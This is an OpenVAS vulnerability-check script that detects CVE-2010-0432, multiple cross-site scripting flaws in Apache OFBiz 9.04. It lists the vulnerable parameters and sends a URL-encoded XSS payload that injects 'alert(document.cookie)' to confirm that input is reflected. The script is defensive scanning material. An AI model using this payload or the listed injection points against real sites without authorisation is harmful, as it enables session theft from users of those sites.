###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ofbiz_mult_xss_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Apache OFBiz Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful attack could lead to execution of arbitrary HTML and script code
  in the context of an affected site and attackers can steal cookie-based
  authentication credentials.
  Impact Level: Application";
tag_affected = "Apache OFBiz 9.04 SVN Revision 920371 and prior,";
tag_insight = "The flaws are caused by improper validation of user-supplied input via,
  (1) the productStoreId parameter to control/exportProductListing,
  (2) the partyId parameter to partymgr/control/viewprofile,
  (3) the start parameter to myportal/control/showPortalPage,
  (4) an invalid URI beginning with /facility/control/ReceiveReturn,
  (5) the contentId parameter to ecommerce/control/ViewBlogArticle,
  (6) the entityName parameter to webtools/control/FindGeneric, or the
  (7) subject or (8) content parameter to an unspecified component under
  ecommerce/control/contactus.";
tag_solution = "Upgrade to the latest version of Apache OFBiz,
  For updates refer to http://ofbiz.apache.org/download.html";
tag_summary = "This host is running Apache OFBiz and is prone to multiple
  Cross-Site Scripting vulnerabilities.";

if(description)
{
  script_id(901105);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-04-29 10:04:32 +0200 (Thu, 29 Apr 2010)");
  script_cve_id("CVE-2010-0432");
  script_bugtraq_id(39489);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Apache OFBiz Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2010/Apr/139");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/510746");
  script_xref(name : "URL" , value : "http://www.bonsai-sec.com/en/research/vulnerabilities/apacheofbiz-multiple-xss-0103.php");

  script_description(desc);
  script_summary("Check attack string for Apache OFBiz");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  exit(0);
}

## Send and Recieve the response
req = http_get(item:"/webtools/control/main", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

## Confirm the application
if("neogia_logo.png" >< res)
{
  ## Construct attack request
  req = http_get(item:"/facility/control/ReceiveReturn%22%3Cb%3E%3Cbody%20"+
                      "onLoad=%22alert(document.cookie)%22%3E%3Cbr%3E%3Cdi"+
                      "v%3E%3E%3C!--", port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm exploit worked by checking the response
  if("alert(document.cookie)" >< res){
    security_warning(port);
  }
}
